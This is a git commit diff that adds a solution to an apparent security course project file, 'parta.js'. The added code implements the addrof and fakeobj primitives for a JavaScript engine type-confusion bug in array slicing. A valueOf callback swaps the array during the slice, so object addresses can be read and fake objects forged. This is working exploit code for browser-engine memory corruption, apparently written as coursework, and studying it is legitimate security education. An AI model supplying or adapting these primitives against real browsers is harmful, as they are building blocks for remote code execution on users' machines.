60289e1db7e664d06d70e6859d02f9c311ccbc3b
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-06 21:29:07 -0500

    Update parta.js

--- proj5/parta.js
+++ proj5/parta.js
@@ -1,3 +1,32 @@
 /*
  * TODO: Part A solution goes here!
  */
+function addrof(object) {
+        var a = [];
+        for (var i = 0; i < 100; i++)
+            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles
+
+        var hax = {valueOf: function() {
+            a.length = 0;
+            a = [object];
+            return 4;
+        }};
+
+        var b = a.slice(0, hax);
+        return Int64.fromDouble(b[3]);
+    }
+
+    function fakeobj(addr) {
+        var a = [];
+        for (var i = 0; i < 100; i++)
+            a.push({});     // Array must be of type ArrayWithContiguous
+
+        addr = addr.asDouble();
+        var hax = {valueOf: function() {
+            a.length = 0;
+            a = [addr];
+            return 4;
+        }};
+
+        return a.slice(0, hax)[3];
+    }
